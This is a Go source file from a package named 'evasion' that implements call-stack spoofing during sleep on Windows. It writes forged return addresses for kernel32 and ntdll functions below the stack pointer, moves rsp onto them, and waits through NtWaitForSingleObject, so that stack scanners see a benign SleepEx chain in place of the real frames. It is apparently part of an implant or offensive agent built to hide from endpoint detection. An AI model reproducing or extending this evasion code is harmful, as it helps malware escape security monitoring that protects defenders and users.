//go:build windows

package evasion

import (
	"fmt"
	"runtime"
	"sync"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

// Link to the Go runtime's scheduler primitives. These mark the current
// goroutine as syscall-exiting so the GC treats the OS thread's stack as
// opaque — no stack walk, no allocation scan — for the duration of the
// wait. Anything that allocates between entersyscall and exitsyscall
// panics the scheduler; the frame-push window is syscall-only by design.
//
//go:linkname entersyscall runtime.entersyscall
func entersyscall(pc, sp uintptr)

//go:linkname exitsyscall runtime.exitsyscall
func exitsyscall()

// getSP and setSP are defined in spoof_windows_amd64.s. Getting / setting
// the stack pointer is the only way to move rsp around the fake frame
// push — Go's unsafe package has no direct SP accessor.
func getSP() uintptr
func setSP(sp uintptr)

// SpoofedSleep sleeps for d with the current thread's stack shaped to
// look like a normal Windows sleep — kernel32!SleepEx called from the
// thread's entry point — instead of the Go runtime netpoller frames.
//
// Approach A from docs/105c-rop-spoof-plan.md:
//  1. LockOSThread — pin the goroutine to one thread.
//  2. Resolve kernel32!SleepEx + ntdll!NtWaitForSingleObject via
//     LazyProc (cached on first call).
//  3. Build a signalled-on-timeout event object.
//  4. entersyscall — mark the goroutine syscall-exiting. GC opaque.
//  5. Push 3 fake return addresses (kernel32!SleepEx, ntdll!NtWait
//     forSingleObject, ntdll!NtWaitForAlertByThreadId) onto the OS
//     thread's stack. Move rsp down 24 bytes.
//  6. Call NtWaitForSingleObject directly — same wait primitive
//     kernel32!SleepEx uses underneath.
//  7. Pop frames, restore rsp.
//  8. exitsyscall — re-enter the scheduler.
//  9. UnlockOSThread, close event.
//
// Layer 2 ships the fake frame push. Layer 3 (105c-3) handles the
// SEH-unwind edge cases and the Go frame beneath the fake chain.
func SpoofedSleep(d time.Duration) error {
	if d <= 0 {
		time.Sleep(d)
		return nil
	}

	procs, perr := loadSpoofProcs()
	if perr != nil {
		time.Sleep(d)
		return perr
	}

	// Pin the goroutine to this OS thread — the frame push is
	// thread-scoped.
	runtime.LockOSThread()
	defer runtime.UnlockOSThread()

	// Create a manual-reset event that starts unsignalled. The wait
	// will time out and return regardless.
	ev, _, _ := procs.createEventW.Call(0, 0, 0, 0)
	if ev == 0 {
		time.Sleep(d)
		return fmt.Errorf("evasion: CreateEventW failed")
	}
	defer procs.closeHandle.Call(ev)

	// Convert to 100-ns units, negative for relative timeout.
	ntTimeout := int64(-d.Nanoseconds() / 100)

	// Capture the current SP. The fake frames go below it.
	sp := getSP()

	// Push 3 fake return addresses. Layout after this:
	//   [sp-8]  = return into kernel32!SleepEx
	//   [sp-16] = return into ntdll!NtWaitForSingleObject
	//   [sp-24] = return into ntdll!NtWaitForAlertByThreadId
	//
	// After setSP(sp-24), a stack walker reading rsp reads the top
	// of the forged chain. NtWaitForSingleObject is called from this
	// fake frame — its return address slot in the forged chain
	// points at kernel32!SleepEx, which is the frame caller the walker
	// sees when it walks deeper.
	sleepEx := procs.sleepEx.Addr()
	ntWait := procs.ntWait.Addr()
	ntAlert := procs.ntAlert.Addr()

	frameBase := sp - 24
	*(*uintptr)(unsafe.Pointer(sp - 8)) = sleepEx
	*(*uintptr)(unsafe.Pointer(sp - 16)) = ntWait
	*(*uintptr)(unsafe.Pointer(sp - 24)) = ntAlert

	// entersyscall — after this, the GC treats the thread stack as
	// foreign. No allocations may happen below this line until
	// exitsyscall.
	pc, _, _, _ := runtime.Caller(0)
	entersyscall(pc, frameBase)

	// Move rsp to the fake frame base, call the wait, restore.
	oldSP := getSP()
	setSP(frameBase)
	procs.ntWait.Call(ev, 0, uintptr(unsafe.Pointer(&ntTimeout)))
	setSP(oldSP)

	exitsyscall()

	// scrub the forged frames — the fake return addresses must not
	// linger on the OS thread's stack after we've returned to the
	// runtime.
	*(*uintptr)(unsafe.Pointer(sp - 8)) = 0
	*(*uintptr)(unsafe.Pointer(sp - 16)) = 0
	*(*uintptr)(unsafe.Pointer(sp - 24)) = 0

	return nil
}

type spoofProcs struct {
	createEventW *windows.LazyProc
	closeHandle  *windows.LazyProc
	ntWait       *windows.LazyProc
	sleepEx      *windows.LazyProc
	ntAlert      *windows.LazyProc
}

var (
	procsOnce sync.Once
	procsVal  *spoofProcs
	procsErr  error
)

func loadSpoofProcs() (*spoofProcs, error) {
	procsOnce.Do(func() {
		k32 := windows.NewLazySystemDLL("kernel32.dll")
		ntd := windows.NewLazySystemDLL("ntdll.dll")
		p := &spoofProcs{
			createEventW: k32.NewProc("CreateEventW"),
			closeHandle:  k32.NewProc("CloseHandle"),
			sleepEx:      k32.NewProc("SleepEx"),
			ntWait:       ntd.NewProc("NtWaitForSingleObject"),
			ntAlert:      ntd.NewProc("NtWaitForAlertByThreadId"),
		}
		procsVal = p
	})
	return procsVal, procsErr
}
